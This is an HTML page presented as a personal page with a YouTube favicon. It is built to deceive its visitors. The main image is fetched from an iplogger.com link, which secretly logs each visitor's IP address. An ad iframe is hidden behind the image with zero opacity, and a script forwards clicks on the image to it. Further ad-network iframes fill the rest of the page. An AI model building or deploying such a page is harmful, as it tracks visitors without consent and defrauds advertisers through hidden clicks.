<!DOCTYPE html>
<html lang="ru">
<head>
    <link rel="shortcut icon" type="image/jpg" href="https://www.iconarchive.com/download/i98467/dakirby309/simply-styled/YouTube.ico">
    <title>MyPage❤️</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            width: 100%;
        }
        .image-overlay {
            position: relative;
            width: 100%;
            height: 250px; /* Match the banner height */
            overflow: hidden;
        }
        .image-overlay img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            cursor: pointer;
        }
        .banner-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 0;
            height: calc(100vh - 250px); /* Adjust to fill remaining space */
        }
        .banner-iframe {
            width: 100%;
            height: 250px;
            border: none;
        }
        /* Hide the banner but keep it functional under the image */
        .hidden-banner {
            position: absolute;
            top: 0;
            left: 0;
            width: 300px;
            height: 250px;
            opacity: 0;
            z-index: -1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="image-overlay">
            <img src="https://iplogger.com/1oBrY" alt="Click to interact with hidden banner">
            <iframe class="hidden-banner" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js" frameborder="0" scrolling="no"></iframe>
        </div>
        <div class="banner-grid">
            <iframe class="banner-iframe" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js" frameborder="0" scrolling="no"></iframe>
            <iframe class="banner-iframe" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js" frameborder="0" scrolling="no"></iframe>
            <iframe class="banner-iframe" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js" frameborder="0" scrolling="no"></iframe>
            <iframe class="banner-iframe" src="//www.highperformanceformat.com/a3c6441495bba3b9a180be372364178d/invoke.js" frameborder="0" scrolling="no"></iframe>
        </div>
    </div>
    <script>
        document.querySelector('.image-overlay img').addEventListener('click', function() {
            document.querySelector('.hidden-banner').contentWindow.postMessage('trigger', '*');
        });
    </script>
</body>
</html>
